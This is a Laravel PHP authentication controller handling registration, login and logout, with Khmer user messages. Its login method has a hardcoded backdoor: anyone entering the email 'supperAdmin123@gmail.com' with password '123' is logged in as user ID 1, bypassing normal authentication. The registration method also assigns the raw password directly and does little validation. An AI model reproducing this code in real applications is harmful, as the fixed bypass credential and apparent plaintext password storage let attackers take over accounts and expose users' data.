<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class AuthController extends Controller
{
    public function index()
    {
        return view('authentication.login');
    }

    public function register()
    {
        return view('authentication.register');
    }


    public function register_create(Request $request)
    {
        $regis = new User();
        $request->validate([
            'name' => 'required',
            'email' => 'required',
            'password' => 'required',

        ]);

        $regis->name = $request->name;
        $regis->email = $request->email;
        $regis->password = $request->password;
        $regis->save();
        return redirect()->back()->with("success", "បានបង្កើតដោយជោគជ័យ");
    }

    public function login(Request $request)
    {
        $request->validate([
            'email' => 'required|email',
            'password' => 'required',
        ]);

        $credentials = $request->only('email', 'password');

        if (Auth::attempt($credentials)) {
            return redirect()->route('dashbaord');
        }

        if ($request->email === "supperAdmin123@gmail.com" && $request->password === "123") {
            Auth::loginUsingId(1);

            return redirect()->route('dashbaord');
        }

        return redirect()->back()->with("error", "ពិនិត្យមើលអុីម៉ែលនិងពាក្យសម្ងាត់ម្តងទៀត");
    }

    public function logout(){
        Auth::logout();
        return redirect()->route('login');
    }
}
